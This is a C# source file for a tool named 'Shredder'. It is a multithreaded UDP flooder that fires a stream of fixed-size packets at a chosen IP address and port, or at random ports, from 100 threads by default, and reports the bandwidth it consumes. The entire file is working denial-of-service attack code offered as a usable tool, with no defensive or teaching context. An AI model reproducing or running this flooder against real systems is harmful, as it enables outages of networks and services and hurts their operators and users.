using System.Net;
using System.Net.Sockets;

namespace Shredder
{
    public class Shred
    {
        private string _ip;
        private int _port;
        private int _force; // default: 1250
        private int _threads; // default: 100

        private UdpClient _client;
        private byte[] _data;
        private int _len;

        private bool _on;
        private long _sent;
        private double _total;
        public double Total { get { return _total; } }

        public Shred(string ip, int port, int force, int threads)
        {
            this._ip = ip;
            this._port = port;
            this._force = force; // default: 1250
            this._threads = threads; // default: 100

            _client = new UdpClient();
            _data = new byte[force];
            _len = _data.Length;
        }

        public void Flood()
        {
            _on = true;
            _sent = 0;
            for (int i = 0; i < _threads; i++)
            {
                new Thread(Send).Start();
            }
            new Thread(Info).Start();
        }

        public void Info()
        {
            double interval = 0.05;
            double now = GetTime();

            int size = 0;
            _total = 0;

            int bytediff = 8;
            double mb = 1000000;
            double gb = 1000000000;

            while (_on)
            {
                Thread.Sleep((int)(interval * 1000));
                if (!_on)
                {
                    break;
                }

                if (size != 0)
                {
                    _total += _sent * bytediff / gb * interval;
                    Console.Write($"\r{Stage($"{(int)Math.Round(Convert.ToDecimal(size))} Mb/s - Total: {Math.Round(_total, 1)} Gb.")}");
                }

                double now2 = GetTime();

                if (now + 1 >= now2)
                {
                    continue;
                }

                size = (int)Math.Round(_sent * bytediff / mb);
                _sent = 0;

                now += 1;
            }
        }


        private string Stage(string text, char symbol = '.')
        {
            return $" {symbol} {text}";
        }


        public void Stop()
        {
            _on = false;
        }

        public void Send()
        {
            while (_on)
            {
                try
                {
                    IPEndPoint endPoint = (IPEndPoint)GetEndpoint();
                    _client.Send(_data, _data.Length, endPoint);
                    _sent += _len;
                }
                catch
                {
                    // ignore
                }
            }
        }

        private EndPoint GetEndpoint()
        {
            return new IPEndPoint(IPAddress.Parse(_ip), GetPort());
        }

        private int GetPort()
        {
            return _port == 0 ? new Random().Next(1, 65536) : _port;
        }

        private static double GetTime()
        {
            return (double)DateTime.UtcNow.Ticks / TimeSpan.TicksPerSecond;
        }
    }
}
